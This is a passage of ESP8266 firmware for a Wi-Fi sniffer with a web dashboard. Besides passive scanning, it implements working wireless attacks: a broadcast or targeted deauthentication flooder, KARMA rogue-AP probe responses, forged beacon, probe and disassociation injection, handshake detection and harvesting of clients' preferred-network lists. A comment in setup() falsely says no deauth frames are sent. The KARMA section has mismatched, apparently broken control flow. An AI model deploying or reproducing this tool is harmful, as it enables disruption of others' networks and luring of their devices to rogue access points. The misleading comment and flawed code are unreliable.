        tr.innerHTML = `<td>${n.channel}</td><td>${n.rssi} (${n.quality}%)</td><td>${n.enc}</td><td>${n.open ? 'Yes' : 'No'}</td><td>${n.hidden ? 'Yes' : 'No'}</td><td>${n.freqMhz} MHz</td><td>${n.bssid}</td><td>${n.ssid}</td>`;
        tbody.appendChild(tr);
      });
    }

    async function loadObservations() {
      const r = await fetch('/observations');
      const j = await r.json();
      const apBody = document.getElementById('obsApBody'); apBody.innerHTML = '';
      (j.aps || []).forEach(a => {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${a.channel}</td><td>${a.rssi}</td><td>${a.vendor||''}</td><td>${a.country||''}</td><td>${a.security}/${a.cipher}/${a.auth}</td><td>${a.bssid}</td><td>${a.ssid||''}</td>`;
        apBody.appendChild(tr);
      });
      const clBody = document.getElementById('obsClientBody'); clBody.innerHTML = '';
      (j.clients || []).forEach(c => {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${c.channel}</td><td>${c.rssi}</td><td>${c.vendor||''}</td><td>${c.locallyAdmin?'LAA':''}</td><td>${c.mac}</td><td>${(c.pnl||[]).join(' | ')}</td>`;
        clBody.appendChild(tr);
      });
      const util = document.getElementById('utilBody'); util.innerHTML = '';
      const u = j.utilization || [], tx = j.activeTx || [];
      for (let ch = 1; ch <= 14; ch++) {
        const val = u[ch-1] || 0; const uniq = tx[ch-1] || 0; const pct = Math.min(100, Math.round(val % 200));
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${ch}</td><td><div class="bar"><span style="width:${pct}%;"></span></div></td><td>${val} pps</td><td>${uniq} TX</td>`;
        util.appendChild(tr);
      }
    }

    async function startDeauth() {
      const target = document.getElementById('deauthTarget').value;
      const bssid = document.getElementById('deauthBssid').value;
      const broadcast = document.getElementById('broadcastDeauth').checked;
      const rate = (document.getElementById('deauthRate') && document.getElementById('deauthRate').value) ? document.getElementById('deauthRate').value : '10';
      const duration = (document.getElementById('deauthDuration') && document.getElementById('deauthDuration').value) ? document.getElementById('deauthDuration').value : '0';
      if (!bssid) { alert('Enter BSSID'); return; }
      if (!broadcast && !target) { alert('Enter target MAC or enable Broadcast'); return; }
      const url = '/deauth/start?bssid=' + encodeURIComponent(bssid) + (broadcast ? '&broadcast=1' : ('&target=' + encodeURIComponent(target))) + '&rate=' + encodeURIComponent(rate) + '&duration=' + encodeURIComponent(duration);
      await call(url); status();
    }
    async function stopDeauth() { await call('/deauth/stop'); status(); }
    async function karma(on) {
      const b = document.getElementById('karmaBssid').value;
      await call('/karma?enable=' + (on ? '1' : '0') + (b ? ('&bssid=' + encodeURIComponent(b)) : ''));
    }

    function init() {
      startMatrix();
      status(); setInterval(() => { status(); if (!document.getElementById('observations').classList.contains('hide')) loadObservations(); }, 1200);
      show('dashboard');
    }
    window.addEventListener('load', init);
  </script>
</head>
<body>
  <canvas id="matrixCanvas"></canvas>
  <div class="container">
    <h1>ESP8266 Matrix Sniffer</h1>
    <div class="nav">
      <button class="tab active" data-view="dashboard" onclick="show('dashboard')">Dashboard</button>
      <button class="tab" data-view="scan" onclick="show('scan')">Scan</button>
      <button class="tab" data-view="observations" onclick="show('observations')">Observations</button>
      <button class="tab" data-view="tools" onclick="show('tools')">Deauth/KARMA</button>
      <button class="tab" data-view="settings" onclick="show('settings')">Settings</button>
    </div>

    <div id="dashboard" class="view">
      <div class="grid">
        <div class="card">
          <div class="row"><span id="led" class="led off"></span> <strong>Sniffer</strong></div>
          <div class="row"><strong>Channel:</strong> <span id="chNow">1</span> <span class="pill">PPS: <span id="pps">0</span></span> <span class="pill">Packets: <span id="pkt">0</span></span></div>
          <div class="row"><button class="btn" onclick="call('/start').then(status)">Start</button><button class="btn" onclick="call('/stop').then(status)">Stop</button>
          <input id="ch" type="number" min="1" max="14" value="1" /><button class="btn" onclick="setCh()">Set CH</button><button class="btn" onclick="hop(true)">Hop On</button><button class="btn" onclick="hop(false)">Hop Off</button></div>
        </div>
        <div class="card">
          <div class="row"><strong>Mgmt counters</strong></div>
          <div class="row">Deauth: <span id="deauth">0</span> &nbsp; Disassoc: <span id="disassoc">0</span></div>
          <div class="row"><strong>Raw Status</strong></div>
          <pre id="status"></pre>
        </div>
      </div>
    </div>

    <div id="scan" class="view hide">
      <div class="card">
        <div class="row"><button class="btn" onclick="scan()">Scan Networks</button><label><input id="fullScan" type="checkbox" checked /> Full scan</label></div>
        <table>
          <thead><tr><th>CH</th><th>RSSI</th><th>ENC</th><th>Open</th><th>Hidden</th><th>Freq</th><th>BSSID</th><th>SSID</th></tr></thead>
          <tbody id="scanBody"></tbody>
        </table>
      </div>
    </div>

    <div id="observations" class="view hide">
      <div class="grid">
        <div class="card">
          <div class="row"><strong>Access Points</strong></div>
          <table>
            <thead><tr><th>CH</th><th>RSSI</th><th>Vendor</th><th>CC</th><th>Sec/Ciph/Auth</th><th>BSSID</th><th>SSID</th></tr></thead>
            <tbody id="obsApBody"></tbody>
          </table>
        </div>
        <div class="card">
          <div class="row"><strong>Clients</strong></div>
          <table>
            <thead><tr><th>CH</th><th>RSSI</th><th>Vendor</th><th>Flags</th><th>MAC</th><th>PNL</th></tr></thead>
            <tbody id="obsClientBody"></tbody>
          </table>
        </div>
        <div class="card">
          <div class="row"><strong>Channel Utilization</strong></div>
          <table>
            <thead><tr><th>CH</th><th>Load</th><th>PPS</th><th>Active TX</th></tr></thead>
            <tbody id="utilBody"></tbody>
          </table>
        </div>
      </div>
    </div>

    <div id="tools" class="view hide">
      <div class="grid">
        <div class="card">
          <div class="row"><strong>Deauthentication Test</strong></div>
          <div class="row">
            <input id="deauthTarget" type="text" placeholder="Target MAC (AA:BB:CC:DD:EE:FF)" />
            <input id="deauthBssid" type="text" placeholder="BSSID MAC (AA:BB:CC:DD:EE:FF)" />
            <label><input id="broadcastDeauth" type="checkbox" /> Broadcast</label>
          </div>
          <div class="row">
            <input id="deauthRate" type="number" min="1" max="100" value="10" placeholder="Rate (pps)" />
            <input id="deauthDuration" type="number" min="0" max="3600000" value="0" placeholder="Duration ms (0=∞)" />
            <button class="btn" onclick="startDeauth()">Start</button>
            <button class="btn btn-danger" onclick="stopDeauth()">Stop</button>
            <span class="pill">Status: <span id="deauthStatus">Inactive</span></span>
            <span class="pill">Sent: <span id="deauthCount">0</span></span>
            <span class="pill">Rate: <span id="deauthRateNow">0</span> pps</span>
          </div>
        </div>
        <div class="card">
          <div class="row"><strong>KARMA Probe Responses</strong></div>
          <div class="row"><input id="karmaBssid" type="text" placeholder="BSSID MAC for responses" />
          <button class="btn" onclick="karma(true)">Enable</button><button class="btn btn-danger" onclick="karma(false)">Disable</button></div>
          <div class="row"><small>Responds to client probe requests with matching SSID using the provided BSSID.</small></div>
        </div>
      </div>
    </div>

    <div id="settings" class="view hide">
      <div class="card">
        <div class="row"><strong>About</strong></div>
        <div class="row">ESP8266 Wi‑Fi Scanner + Sniffer. Visual theme inspired by The Matrix. Use features responsibly.</div>
      </div>
    </div>

  </div>
</body>
</html>
)HTML";

String runScanAndGetJson(bool full) {
  bool wasSniffing = snifferActive;
  if (wasSniffing) stopSniffer();
  WiFi.mode(WIFI_AP_STA);

  // Scan either all channels (full) or just the current channel for speed
  int scanChannel = full ? 0 : currentChannel; // 0 = all
  int n = WiFi.scanNetworks(false, true, (uint8_t)scanChannel);

  String out = "{\"count\":" + String(n) + ",\"networks\":[";
  for (int i = 0; i < n; i++) {
    String enc;
    switch (WiFi.encryptionType(i)) {
      case ENC_TYPE_NONE: enc = "OPEN"; break;
      case ENC_TYPE_WEP: enc = "WEP"; break;
      case ENC_TYPE_TKIP: enc = "WPA/TKIP"; break;
      case ENC_TYPE_CCMP: enc = "WPA2/CCMP"; break;
      case ENC_TYPE_AUTO: enc = "AUTO"; break;
      default: enc = "?"; break;
    }
    bool isOpen = (WiFi.encryptionType(i) == ENC_TYPE_NONE);
    String ssid = WiFi.SSID(i);
    bool isHidden = (ssid.length() == 0);
    int ch = WiFi.channel(i);
    int freqMhz = (ch >= 1 && ch <= 14) ? (2412 + (ch - 1) * 5) : 0;
    int rssi = WiFi.RSSI(i);
    int quality = rssi <= -100 ? 0 : (rssi >= -50 ? 100 : 2 * (rssi + 100));
    if (i) out += ",";
    out += "{\"channel\":" + String(ch) +
           ",\"rssi\":" + String(rssi) +
           ",\"quality\":" + String(quality) +
           ",\"freqMhz\":" + String(freqMhz) +
           ",\"enc\":\"" + enc + "\"" +
           ",\"open\":" + String(isOpen ? "true" : "false") +
           ",\"hidden\":" + String(isHidden ? "true" : "false") +
           ",\"bssid\":\"" + WiFi.BSSIDstr(i) + "\"" +
           ",\"ssid\":\"" + ssid + "\"}";
  }
  out += "]}";
  WiFi.scanDelete();
  if (wasSniffing) startSniffer();
  return out;
}

void setupHttpHandlers() {
  server.on("/", HTTP_GET, []() {
    server.send_P(200, "text/html", INDEX_HTML);
  });

  server.on("/status", HTTP_GET, []() {
    server.send(200, "application/json", buildStatusJson());
  });

  server.on("/start", HTTP_GET, []() {
    startSniffer();
    server.send(200, "text/plain", "ok");
  });

  server.on("/stop", HTTP_GET, []() {
    stopSniffer();
    server.send(200, "text/plain", "ok");
  });

  server.on("/setChannel", HTTP_GET, []() {
    if (!server.hasArg("ch")) { server.send(400, "text/plain", "missing ch"); return; }
    int ch = server.arg("ch").toInt();
    if (ch < 1 || ch > 14) { server.send(400, "text/plain", "invalid ch"); return; }
    channelHopTicker.detach();
    setChannel((uint8_t)ch);
    restartAccessPointOnChannel((uint8_t)ch);
    server.send(200, "text/plain", "ok");
  });

  server.on("/hop", HTTP_GET, []() {
    bool enable = server.arg("enable") == "1" || server.arg("enable") == "true";
    channelHopTicker.detach();
    if (enable) {
      channelHopTicker.attach(0.25f, hopChannel);
    }
    server.send(200, "text/plain", "ok");
  });

  // Injection endpoints (test only; ensure legal use)
  server.on("/inject/beacon", HTTP_GET, []() {
    if (!server.hasArg("ssid") || !server.hasArg("bssid")) { server.send(400, "text/plain", "missing ssid or bssid"); return; }
    String ssid = server.arg("ssid");
    uint8_t bssid[6]; if (!parseMac(server.arg("bssid"), bssid)) { server.send(400, "text/plain", "bad bssid"); return; }
    uint8_t ch = server.hasArg("ch") ? (uint8_t)server.arg("ch").toInt() : wifi_get_channel();
    uint16_t intv = server.hasArg("intv") ? (uint16_t)server.arg("intv").toInt() : 100;
    sendBeaconOnce(ssid.c_str(), bssid, ch, intv);
    server.send(200, "text/plain", "ok");
  });

  server.on("/inject/proberesp", HTTP_GET, []() {
    if (!server.hasArg("ssid") || !server.hasArg("bssid") || !server.hasArg("dst")) { server.send(400, "text/plain", "missing ssid/bssid/dst"); return; }
    String ssid = server.arg("ssid");
    uint8_t bssid[6], dst[6];
    if (!parseMac(server.arg("bssid"), bssid) || !parseMac(server.arg("dst"), dst)) { server.send(400, "text/plain", "bad mac"); return; }
    uint8_t ch = server.hasArg("ch") ? (uint8_t)server.arg("ch").toInt() : wifi_get_channel();
    sendProbeRespOnce(ssid.c_str(), bssid, dst, ch);
    server.send(200, "text/plain", "ok");
  });

  server.on("/inject/disassoc", HTTP_GET, []() {
    if (!server.hasArg("bssid") || !server.hasArg("dst")) { server.send(400, "text/plain", "missing bssid/dst"); return; }
    uint8_t bssid[6], dst[6];
    if (!parseMac(server.arg("bssid"), bssid) || !parseMac(server.arg("dst"), dst)) { server.send(400, "text/plain", "bad mac"); return; }
    uint16_t reason = server.hasArg("reason") ? (uint16_t)server.arg("reason").toInt() : 1;
    sendDisassocOnce(dst, bssid, reason);
    server.send(200, "text/plain", "ok");
  });

  // KARMA-style: respond to probe requests with matching SSID
  server.on("/karma", HTTP_GET, []() {
    bool en = server.hasArg("enable") && (server.arg("enable") == "1" || server.arg("enable") == "true");
    karmaActive = en;
    if (en && server.hasArg("bssid")) parseMac(server.arg("bssid"), (uint8_t*)karmaBssid);
    server.send(200, "text/plain", "ok");
  });

  server.on("/scan", HTTP_GET, []() {
    bool full = server.hasArg("full") && (server.arg("full") == "1" || server.arg("full") == "true");
    server.send(200, "application/json", runScanAndGetJson(full));
  });

  // Experimental: expose observed AP/client summaries collected from beacons/probes
  server.on("/observations", HTTP_GET, []() {
    String out = "{";
    out += "\"aps\":[";
    bool first = true;
    for (int i = 0; i < (int)(sizeof(g_aps)/sizeof(g_aps[0])); i++) {
      bool used = false; for (int j = 0; j < 6; j++) if (g_aps[i].bssid[j] != 0) { used = true; break; }
      if (!used) continue;
      if (!first) out += ","; first = false;
      char macStr[18]; formatMac(g_aps[i].bssid, macStr, sizeof(macStr));
      out += "{\"bssid\":\""; out += macStr; out += "\",";
      out += "\"ssid\":\""; out += g_aps[i].ssid; out += "\",";
      out += "\"hidden\":"; out += (g_aps[i].hidden ? "true" : "false"); out += ",";
      out += "\"rssi\":"; out += String(g_aps[i].lastRssi); out += ",";
      out += "\"channel\":"; out += String(g_aps[i].channel); out += ",";
      out += "\"vendor\":\""; out += g_aps[i].vendor; out += "\",";
      out += "\"country\":\""; out += g_aps[i].country; out += "\",";
      out += "\"rates\":\""; out += g_aps[i].rates; out += "\",";
      out += "\"beaconInterval\":"; out += String(g_aps[i].beaconInterval); out += ",";
      out += "\"dtim\":"; out += String(g_aps[i].dtimPeriod); out += ",";
      out += "\"privacy\":"; out += (g_aps[i].privacy ? "true" : "false"); out += ",";
      out += "\"shortPreamble\":"; out += (g_aps[i].shortPreamble ? "true" : "false"); out += ",";
      out += "\"wmm\":"; out += (g_aps[i].qosWmm ? "true" : "false"); out += ",";
      out += "\"security\":\""; out += g_aps[i].security; out += "\",";
      out += "\"cipher\":\""; out += g_aps[i].cipher; out += "\",";
      out += "\"auth\":\""; out += g_aps[i].auth; out += "\",";
      out += "\"beacons\":"; out += String(g_aps[i].beaconCount); out += ",";
      out += "\"mgmt\":"; out += String(g_aps[i].mgmtCount); out += ",";
      out += "\"ctrl\":"; out += String(g_aps[i].ctrlCount); out += ",";
      out += "\"data\":"; out += String(g_aps[i].dataCount); out += ",";
      out += "\"clients\":"; out += String(g_aps[i].clientCount); out += ",";
      out += "\"eapol\":"; out += String(g_aps[i].eapolCount);
      out += "}";
    }
    out += "],\"clients\":[";
    first = true;
    for (int i = 0; i < (int)(sizeof(g_clients)/sizeof(g_clients[0])); i++) {
      bool used = false; for (int j = 0; j < 6; j++) if (g_clients[i].mac[j] != 0) { used = true; break; }
      if (!used) continue;
      if (!first) out += ","; first = false;
      char macStr[18]; formatMac(g_clients[i].mac, macStr, sizeof(macStr));
      out += "{\"mac\":\""; out += macStr; out += "\",";
      out += "\"rssi\":"; out += String(g_clients[i].lastRssi); out += ",";
      out += "\"channel\":"; out += String(g_clients[i].lastChannel); out += ",";
      out += "\"locallyAdmin\":"; out += (g_clients[i].locallyAdmin ? "true" : "false"); out += ",";
      out += "\"vendor\":\""; out += g_clients[i].vendor; out += "\",";
      char bssidStr[18]; formatMac(g_clients[i].associatedBssid, bssidStr, sizeof(bssidStr));
      out += "\"associatedBssid\":\""; out += bssidStr; out += "\",";
      out += "\"expectedAuth\":\""; out += g_clients[i].expectedAuth; out += "\",";
      out += "\"pnl\":[";
      for (uint8_t p = 0; p < g_clients[i].pnlCount; p++) {
        if (p) out += ","; out += "\""; out += g_clients[i].pnl[p]; out += "\"";
      }
      out += "],\"roam\":"; out += String(g_clients[i].roamCount); out += ",";
      out += "\"eapol\":"; out += String(g_clients[i].eapolCount); out += ",";
      out += "\"handshake\":"; out += (g_clients[i].handshakeSeen ? "true" : "false"); out += ",";
      out += "\"channelHits\":[";
      for (int ch = 1; ch <= 14; ch++) { if (ch > 1) out += ","; out += String(g_clients[i].channelHits[ch]); }
      out += "]}";
    }
    out += "]}";
    server.send(200, "application/json", out);
  });

  server.on("/deauth/start", HTTP_GET, []() {
    if (!server.hasArg("bssid")) {
      server.send(400, "text/plain", "missing bssid");
      return;
    }
    
    const bool broadcast = server.hasArg("broadcast") &&
                           (server.arg("broadcast") == "1" || server.arg("broadcast") == "true");
    
    String bssidStr = server.arg("bssid");
    
    // Parse MAC addresses
    if (broadcast) {
      for (int i = 0; i < 6; i++) deauthTarget[i] = 0xFF;
    } else {
      if (!server.hasArg("target")) {
        server.send(400, "text/plain", "missing target MAC when broadcast=0");
        return;
      }
      String targetStr = server.arg("target");
      if (sscanf(targetStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
                 &deauthTarget[0], &deauthTarget[1], &deauthTarget[2],
                 &deauthTarget[3], &deauthTarget[4], &deauthTarget[5]) != 6) {
        server.send(400, "text/plain", "invalid target MAC");
        return;
      }
    }
    
    if (sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
               &deauthBssid[0], &deauthBssid[1], &deauthBssid[2],
               &deauthBssid[3], &deauthBssid[4], &deauthBssid[5]) != 6) {
      server.send(400, "text/plain", "invalid BSSID MAC");
      return;
    }
    
    // Optional rate and duration
    uint32_t rate = 10; // packets per second
    if (server.hasArg("rate")) {
      rate = (uint32_t)server.arg("rate").toInt();
      if (rate < 1) rate = 1; if (rate > 100) rate = 100;
    }
    uint32_t durationMs = 0; // 0 = run until stopped
    if (server.hasArg("duration")) {
      durationMs = (uint32_t)server.arg("duration").toInt();
      if (durationMs > 60UL * 60UL * 1000UL) durationMs = 60UL * 60UL * 1000UL; // cap at 1h
    }

    deauthIntervalMs = 1000UL / rate;
    deauthEndAtMs = durationMs ? (millis() + durationMs) : 0;

    // Start deauth test
    deauthTestActive = true;
    deauthSentCount = 0;
    deauthBroadcast = broadcast;
    deauthTicker.detach();
    deauthTicker.attach_ms(deauthIntervalMs, sendDeauth);
    server.send(200, "text/plain", "ok");
  });

  server.on("/deauth/stop", HTTP_GET, []() {
    deauthTestActive = false;
    deauthTicker.detach();
    deauthBroadcast = false;
    server.send(200, "text/plain", "ok");
  });

  server.onNotFound([]() {
    server.send(404, "text/plain", "Not found");
  });
}

// -------------------- Channel control --------------------
void setChannel(uint8_t ch) {
  if (ch < 1) ch = 1;
  if (ch > 14) ch = 14;
  currentChannel = ch;
  wifi_set_channel(currentChannel);
}

void hopChannel() {
  uint8_t next = currentChannel + 1;
  if (next > 13) next = 1;  // 1..13 commonly used
  setChannel(next);
}

// -------------------- Promiscuous callback --------------------
static void wifiSnifferCallback(uint8_t *buf, uint16_t len) {
  // Keep this callback robust across SDK/core versions: just count packets and emit PPS
  static uint32_t lastSummaryMs = 0;
  static uint32_t lastSummaryCount = 0;
  static uint32_t lastRateWindowMs = 0;
  static uint32_t deauthInWindow = 0;

  sniffedPacketCount++;

  // Parse minimal 802.11 header when possible to detect deauth/disassoc frames
  if (len >= sizeof(SnifferRxCtrl) + sizeof(WifiMacHeader)) {
    SnifferPacket *sp = (SnifferPacket *)buf;
    WifiMacPacket *mp = (WifiMacPacket *)(sp->payload);
    uint16_t fc = mp->header.frameControl;
    uint8_t type = getFrameType(fc);
    uint8_t subtype = getFrameSubtype(fc);
    // Channel utilization accounting
    uint8_t chNow = wifi_get_channel();
    if (chNow >= 1 && chNow <= 14) {
      chPps[chNow]++;
      addUniqueTx(chNow, mp->header.addr2);
    }
    if (type == 0 /* MGMT */) {
      if (subtype == 0x0C) { // Deauthentication
        deauthCount++;
        deauthInWindow++;
      } else if (subtype == 0x0A) { // Disassociation
        disassocCount++;
      } else if (subtype == 0x08 || subtype == 0x05) { // Beacon or ProbeResp
        const uint8_t *body = (const uint8_t *)(&mp->payload[0]);
        // body length is total len - rx_ctrl - header
        uint16_t bodyLen = 0;
        if (len >= sizeof(SnifferRxCtrl) + sizeof(WifiMacHeader)) {
          bodyLen = len - sizeof(SnifferRxCtrl) - sizeof(WifiMacHeader);
        }
        int apIdx = ensureApIndex(mp->header.addr3);
        g_aps[apIdx].mgmtCount++;
        updateApFromMgmt(mp, body, bodyLen, sp->rx_ctrl.rssi);
      } else if (subtype == 0x04 || subtype == 0x00 || subtype == 0x02) { // ProbeReq/AssocReq/ReassocReq
        const uint8_t *body = (const uint8_t *)(&mp->payload[0]);
        uint16_t bodyLen = 0;
        if (len >= sizeof(SnifferRxCtrl) + sizeof(WifiMacHeader)) {
          bodyLen = len - sizeof(SnifferRxCtrl) - sizeof(WifiMacHeader);
        }
        updateClientFromMgmt(mp, body, bodyLen, sp->rx_ctrl.rssi, subtype);
        // Increment channel hits for client
        int cliIdx = ensureClientIndex(mp->header.addr2);
        uint8_t ch = wifi_get_channel();
        if (ch >= 1 && ch <= 14) g_clients[cliIdx].channelHits[ch]++;

    // KARMA: reply to probe requests with SSID IE
        if (karmaActive && subtype == 0x04) {
          // parse SSID IE
          const uint8_t *ie = body; uint16_t r = bodyLen;
          while (r >= 2) {
            uint8_t id = ie[0]; uint8_t l = ie[1];
            if (r < (uint16_t)(2 + l)) break;
            const uint8_t *val = ie + 2;
            if (id == 0 && l > 0) {
              sendProbeRespOnce((const char*)val, karmaBssid, mp->header.addr2, chNow);
              break;
            }
            ie += 2 + l; r -= 2 + l;
      }
    } else if (type == 2 /* DATA */) {
      // Minimal EAPOL detection: LLC SNAP header followed by EAPOL EtherType 0x888E
      // We need at least rx_ctrl + 802.11 header + LLC/SNAP (8) + EAPOL(1)
      if (len > sizeof(SnifferRxCtrl) + sizeof(WifiMacHeader) + 8) {
        const uint8_t *pl = (const uint8_t *)(&mp->payload[0]);
        // Look for LLC SNAP: AA AA 03 00 00 00 88 8E
        if (pl[0]==0xAA && pl[1]==0xAA && pl[2]==0x03 && pl[3]==0x00 && pl[4]==0x00 && pl[5]==0x00 && pl[6]==0x88 && pl[7]==0x8E) {
          // Count per AP and per client
          int apIdx = ensureApIndex(mp->header.addr3);
          g_aps[apIdx].eapolCount++;
          int cliIdx = ensureClientIndex(mp->header.addr2);
          g_clients[cliIdx].eapolCount++;
          g_clients[cliIdx].lastEapolMs = millis();
          // Heuristic: if we observe >=4 EAPOL frames between the same parties within a window, mark handshake seen
          if (g_clients[cliIdx].eapolCount >= 4) {
            g_clients[cliIdx].handshakeSeen = true;
            memcpy(g_clients[cliIdx].associatedBssid, mp->header.addr3, 6);
          }
        }
      }
        }
      }
    } else if (type == 1 /* CTRL */) {
      int apIdx = ensureApIndex(mp->header.addr3);
      g_aps[apIdx].ctrlCount++;
    } else if (type == 2 /* DATA */) {
      int apIdx = ensureApIndex(mp->header.addr3);
      g_aps[apIdx].dataCount++;
    }
  }

  uint32_t now = millis();
  if (now - lastSummaryMs >= 1000) {
    uint32_t diff = sniffedPacketCount - lastSummaryCount;
    uint8_t chNow = wifi_get_channel();
    Serial.printf("[sniffer] CH:%u PPS:%lu TOTAL:%lu\n", chNow, (unsigned long)diff, (unsigned long)sniffedPacketCount);
    lastSummaryMs = now;
    lastSummaryCount = sniffedPacketCount;
  }

  // Simple alert on deauth storm (>20 per second)
  if (now - lastRateWindowMs >= 1000) {
    if (deauthInWindow > 20) {
      Serial.printf("[alert] Deauth storm detected: %lu deauth/s (CH:%u)\n", (unsigned long)deauthInWindow, wifi_get_channel());
    }
    deauthInWindow = 0;
    lastRateWindowMs = now;
  }
}

// -------------------- Sniffer control --------------------
void startSniffer() {
  if (snifferActive) return;
  // Keep AP online for UI, sniff in AP+STA mode
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  delay(20);

  wifi_promiscuous_enable(false);
  wifi_set_promiscuous_rx_cb(wifiSnifferCallback);
  setChannel(currentChannel);
  wifi_promiscuous_enable(true);

  channelHopTicker.detach();
  channelHopTicker.attach(0.25f, hopChannel);  // 4 hops/sec

  snifferActive = true;
  Serial.println("[sniffer] started (promiscuous mode enabled, channel hopping)");
}

void stopSniffer() {
  if (!snifferActive) return;
  channelHopTicker.detach();
  wifi_promiscuous_enable(false);
  snifferActive = false;
  Serial.println("[sniffer] stopped");
}

// -------------------- Scanner --------------------
void scanNetworks() {
  bool wasSniffing = snifferActive;
  if (wasSniffing) stopSniffer();

  Serial.println("[scan] scanning... (this may take a few seconds)");
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  int n = WiFi.scanNetworks(false, true);  // block, show hidden
  if (n <= 0) {
    Serial.println("[scan] no networks found");
  } else {
    Serial.printf("[scan] found %d networks\n", n);
    Serial.println("#  CH  RSSI  ENC        BSSID              SSID");
    for (int i = 0; i < n; i++) {
      String enc;
      switch (WiFi.encryptionType(i)) {
        case ENC_TYPE_NONE: enc = "OPEN"; break;
        case ENC_TYPE_WEP: enc = "WEP"; break;
        case ENC_TYPE_TKIP: enc = "WPA/TKIP"; break;
        case ENC_TYPE_CCMP: enc = "WPA2/CCMP"; break;
        case ENC_TYPE_AUTO: enc = "AUTO"; break;
        default: enc = "?"; break;
      }
      Serial.printf("%02d %3d %5d  %-9s  %s  %s\n",
                    i + 1,
                    WiFi.channel(i),
                    WiFi.RSSI(i),
                    enc.c_str(),
                    WiFi.BSSIDstr(i).c_str(),
                    WiFi.SSID(i).c_str());
    }
  }
  WiFi.scanDelete();
  if (wasSniffing) startSniffer();
}

// -------------------- Serial control --------------------
void printHelp() {
  Serial.println();
  Serial.println("Commands:");
  Serial.println("  s        -> scan networks");
  Serial.println("  p        -> start sniffing (promiscuous, channel hopping)");
  Serial.println("  x        -> stop sniffing");
  Serial.println("  cN       -> set channel (1-14), e.g. c6");
  Serial.println();
}

void handleSerial() {
  if (!Serial.available()) return;
  char c = Serial.read();
  if (c == 's') {
    scanNetworks();
  } else if (c == 'p') {
    startSniffer();
  } else if (c == 'x') {
    stopSniffer();
  } else if (c == 'c') {
    // read channel number
    String num;
    delay(2);
    while (Serial.available()) {
      char d = Serial.peek();
      if (d >= '0' && d <= '9') {
        num += (char)Serial.read();
      } else {
        break;
      }
    }
    int ch = num.toInt();
    if (ch >= 1 && ch <= 14) {
      channelHopTicker.detach();
      setChannel((uint8_t)ch);
      Serial.printf("[ch] locked to channel %d (hopping disabled)\n", ch);
    } else {
      Serial.println("[ch] invalid channel (1-14)");
    }
  } else if (c == 'h') {
    channelHopTicker.detach();
    channelHopTicker.attach(0.25f, hopChannel);
    Serial.println("[ch] channel hopping enabled");
  } else if (c == '\n' || c == '\r') {
    // ignore
  } else {
    printHelp();
  }
}

// -------------------- Arduino entry --------------------
void setup() {
  Serial.begin(115200);
  delay(100);
  Serial.println();
  Serial.println("ESP8266 Wi-Fi Scanner + Sniffer");
  Serial.println("------------------------------------------------");
  WiFi.persistent(false);
  WiFi.mode(WIFI_AP_STA);
  // Set TX power to maximum allowed by the core (dBm). Affects SoftAP/beacons only.
  // This does not transmit any management frames like deauth; detection remains passive.
  WiFi.setOutputPower(20.5f);
  WiFi.disconnect();
  setChannel(1);
  startAccessPoint(currentChannel);
  setupHttpHandlers();
  server.begin();
  printHelp();
}

void loop() {
  handleSerial();
  server.handleClient();
  delay(1);
}


